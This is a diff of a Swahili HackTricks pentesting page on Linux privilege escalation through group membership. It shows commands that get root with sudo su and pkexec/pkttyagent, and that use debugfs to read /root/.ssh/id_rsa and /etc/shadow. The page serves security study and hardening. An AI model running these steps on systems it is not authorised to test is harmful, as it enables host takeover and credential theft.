@@ -1,11 +1,10 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-
 # Sudo/Admin Groups
 
 ## **PE - Method 1**
 
-**Wakati mwingine**, **kwa kawaida \(au kwa sababu programu fulani inahitaji hivyo\)** ndani ya faili ya **/etc/sudoers** unaweza kupata baadhi ya mistari hii:
+**Wakati mwingine**, **kwa kawaida \(au kwa sababu programu fulani inahitaji hivyo\)** ndani ya faili **/etc/sudoers** unaweza kupata baadhi ya mistari hii:
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -13,7 +12,7 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwenye kundi la sudo au admin anaweza kutekeleza chochote kama sudo**.
+Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwa kundi la sudo au admin anaweza kutekeleza chochote kama sudo**.
 
 Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
 ```text
@@ -29,7 +28,7 @@ Ikiwa unapata kwamba binary pkexec ni binary ya SUID na unategemea sudo au admin
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Hapo utapata ni vikundi vipi vinavyoruhusiwa kutekeleza **pkexec** na **kwa kawaida** katika baadhi ya linux vinaweza **kuonekana** baadhi ya vikundi **sudo au admin**.
+Hapo utapata ni vikundi vipi vinavyoruhusiwa kutekeleza **pkexec** na **kwa default** katika baadhi ya linux vinaweza **kuonekana** baadhi ya vikundi **sudo au admin**.
 
 Ili **kuwa root unaweza kutekeleza**:
 ```bash
@@ -41,7 +40,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Sio kwa sababu huna ruhusa bali kwa sababu haujaunganishwa bila GUI**. Na kuna suluhisho la tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **sehemu 2 tofauti za ssh**:
+**Sio kwa sababu huna ruhusa bali kwa sababu haujaunganishwa bila GUI**. Na kuna suluhisho kwa tatizo hili hapa: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Unahitaji **sehemu 2 tofauti za ssh**:
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -60,7 +59,7 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 Hii inamaanisha kwamba **mtumiaji yeyote anaye belong kwa kundi la wheel anaweza kutekeleza chochote kama sudo**.
 
-Ikiwa hii ni hali, **ili kuwa root unaweza tu kutekeleza**:
+Ikiwa hii ni hali, ili **kuwa root unaweza tu kutekeleza**:
 ```text
 sudo su
 ```
@@ -84,12 +83,12 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Kumbuka kwamba ukitumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili nakala ya `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
+Kumbuka kwamba kutumia debugfs unaweza pia **kuandika faili**. Kwa mfano, ili nakala ya `/tmp/asd1.txt` kwenda `/tmp/asd2.txt` unaweza kufanya:
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-Hata hivyo, ikiwa unajaribu **kuandika faili zinazomilikiwa na root** \(kama `/etc/shadow` au `/etc/passwd`\) utapata kosa la "**Ruhusa imekataliwa**".
+Hata hivyo, ukijaribu **kuandika faili zinazomilikiwa na root** \(kama `/etc/shadow` au `/etc/passwd`\) utapata kosa la "**Permission denied**".
 
 # Video Group
 
@@ -124,15 +123,18 @@ find / -group root -perm -g=w 2>/dev/null
 ```
 # Kundi la Docker
 
-Unaweza kuunganisha mfumo wa faili wa mizizi wa mashine mwenyeji kwenye kiasi cha mfano, hivyo wakati mfano unapoanza, mara moja inachaji `chroot` kwenye kiasi hicho. Hii inakupa kwa ufanisi mizizi kwenye mashine hiyo.
+Unaweza kuunganisha mfumo wa faili wa mwenyeji kwenye kiasi cha mfano, hivyo wakati mfano unapoanza, mara moja inachaji `chroot` kwenye kiasi hicho. Hii inakupa kwa ufanisi root kwenye mashine.
 
-{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
+{{#ref}}
+https://github.com/KrustyHack/docker-privilege-escalation
+{{#endref}}
 
-{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
+{{#ref}}
+https://fosterelli.co/privilege-escalation-via-docker.html
+{{#endref}}
 
 # Kundi la lxc/lxd
 
 [lxc - Kuinua Haki](lxd-privilege-escalation.md)
-
 
 {{#include ../../banners/hacktricks-training.md}}
